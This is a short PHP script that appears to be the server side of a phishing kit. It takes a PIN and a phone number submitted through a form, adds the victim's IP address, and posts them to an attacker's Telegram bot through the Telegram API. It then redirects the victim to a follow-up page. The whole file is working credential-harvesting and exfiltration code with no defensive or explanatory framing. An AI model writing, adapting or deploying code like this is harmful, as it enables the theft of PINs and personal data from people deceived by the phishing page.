<?php
include('dt.php');
error_reporting(E_ALL & ~E_NOTICE);
session_start();
function get_client_ip() {
  $ipaddress = '';
  if (getenv('HTTP_CLIENT_IP'))
      $ipaddress = getenv('HTTP_CLIENT_IP');
  else if(getenv('HTTP_X_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
  else if(getenv('HTTP_X_FORWARDED'))
      $ipaddress = getenv('HTTP_X_FORWARDED');
  else if(getenv('HTTP_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_FORWARDED_FOR');
  else if(getenv('HTTP_FORWARDED'))
     $ipaddress = getenv('HTTP_FORWARDED');
  else if(getenv('REMOTE_ADDR'))
      $ipaddress = getenv('REMOTE_ADDR');
  else
      $ipaddress = 'UNKNOWN';
  if (strpos($ipaddress, ",") !== false) :
    $ipaddress = strtok($ipaddress, ",");
  endif;
  return $ipaddress;}
$ip=get_client_ip();
$pin = $_POST['pin_xd'];
$tlf = $_POST['tlf_xd'];
@session_start();
if ( isset ($pin) ){
$message = "pin: ".$pin."\r\n Telefono: ".$tlf."\r\n";
$message .= " IP= ".$ip."\r\n";
$apiToken = $apibot;
$data = [
  'chat_id' =>  $canal,
   'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
echo '<script type="text/javascript">window.location.href = "flimerfinish.php";</script>';}

       exit;?>